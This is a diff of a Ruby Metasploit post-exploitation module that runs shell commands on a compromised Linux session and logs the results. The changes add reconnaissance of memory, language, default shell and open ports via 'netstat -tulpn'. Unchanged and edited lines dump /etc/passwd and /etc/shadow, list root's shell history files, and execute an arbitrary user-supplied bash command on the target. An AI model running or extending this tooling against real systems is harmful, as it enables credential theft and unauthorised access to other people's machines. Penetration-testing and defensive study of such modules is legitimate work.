@@ -207,13 +207,16 @@ def run
       distro_uname = cmd_exec("uname -a")
       current_shell = cmd_exec("echo $0")
       distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
+      default_shell = cmd_exec("ps -p $$ | tail -1 | awk '{ print $4 }'")
       gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
       interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
       hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode' | awk {'print $3'}")
       hardware_vendor = cmd_exec("lscpu | grep 'Vendor ID' | awk {'print $3'}")
+      mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
+      sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
+      mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
       model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
       distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
-      distro_mem = cmd_exec("cat /proc/meminfo | grep \"MemTotal\"; cat /proc/meminfo | grep \"MemFree\"; cat /proc/meminfo | grep \"MemAvailable\"; cat /proc/meminfo | grep \"Dirty\"")
         print_status("Storing results into msf database ..")
         Rex::sleep(0.5)
         #
@@ -224,11 +227,14 @@ def run
         data_dump << "Date/Hour: " + date_out + "\n"
         data_dump << "----------------------------\n"
         data_dump << "Running on session  : #{datastore['SESSION']}\n"
+        data_dump << "Target Computer     : #{sys_info['Computer']}\n"
         data_dump << "Target Architecture : #{sys_info['Architecture']}\n"
         data_dump << "Target Arch (bits)  : #{hardware_bits}\n"
         data_dump << "Target Arch (vendor): #{hardware_vendor}\n"
-        data_dump << "Arch (Model name)   : #{model_name}\n"
-        data_dump << "Target Computer     : #{sys_info['Computer']}\n"
+        data_dump << "CPU (Model name)    : #{model_name}\n"
+        data_dump << "Target mem free     : #{mem_free}\n"
+        data_dump << "Target mem total    : #{mem_total}\n"
+        data_dump << "System language     : #{sys_lang}\n"
         data_dump << "Target interface    : #{interface}\n"
         data_dump << "Target IP addr      : #{host_ip}\n"
         data_dump << "Target gateway      : #{gateway}\n"
@@ -246,13 +252,13 @@ def run
         data_dump << "------------\n"
         data_dump << storage_mont
         data_dump << "\n\n"
-        data_dump << "MEMORY STATS\n"
-        data_dump << "------------\n"
-        data_dump << distro_mem
-        data_dump << "\n\n"
         data_dump << "CURRENT SHELL\n"
         data_dump << "-------------\n"
         data_dump << current_shell
+        data_dump << "\n\n"
+        data_dump << "DEFAULT SYSTEM SHELL\n"
+        data_dump << "--------------------\n"
+        data_dump << default_shell
         data_dump << "\n\n"
         data_dump << "AVAILABLE SHELLS\n"
         data_dump << "----------------\n"
@@ -271,14 +277,15 @@ def run
           #
           # bash commands to be executed remotelly ..
           #
+          net_stat = cmd_exec("netstat -tulpn")
           demi_bios = cmd_exec("dmidecode -t bios")
           cron_tasks = cmd_exec("ls -la /etc/cron*")
-          net_stat = cmd_exec("netstat -ano | grep 'tcp'")
           root_services = cmd_exec("ps -aux | grep '^root'")
           distro_history = cmd_exec("ls -la /root/.*_history")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
-          print_status("Storing results into msf database ..")
-          Rex::sleep(0.5)            #
+            print_status("Storing results into msf database ..")
+            Rex::sleep(0.5)
+            #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
@@ -302,8 +309,8 @@ def run
             data_dump << "-------------\n"
             data_dump << cron_tasks
             data_dump << "\n\n"
-            data_dump << "NETSTAT -ANO | GREP TCP\n"
-            data_dump << "-----------------------\n"
+            data_dump << "TARGET OPEN PORTS\n"
+            data_dump << "-----------------\n"
             data_dump << net_stat
             data_dump << "\n\n"
             data_dump << "SMBIOS DATA (sysfs)\n"
@@ -331,8 +338,8 @@ def run
           # dump etc/passwd & etc/shadow files from target
           etc_pass = cmd_exec("cat /etc/passwd")
           etc_shadow = cmd_exec("cat /etc/shadow")
-          print_status("Storing results into msf database ..")
-          Rex::sleep(0.5)
+            print_status("Storing results into msf database ..")
+            Rex::sleep(0.5)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
@@ -376,8 +383,8 @@ def run
           Rex::sleep(0.5)
           # bash command to be executed remotelly ..
           single_comm = cmd_exec("#{exec_bash}")
-          print_status("Storing results into msf database ..")
-          Rex::sleep(0.5)
+            print_status("Storing results into msf database ..")
+            Rex::sleep(0.5)
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
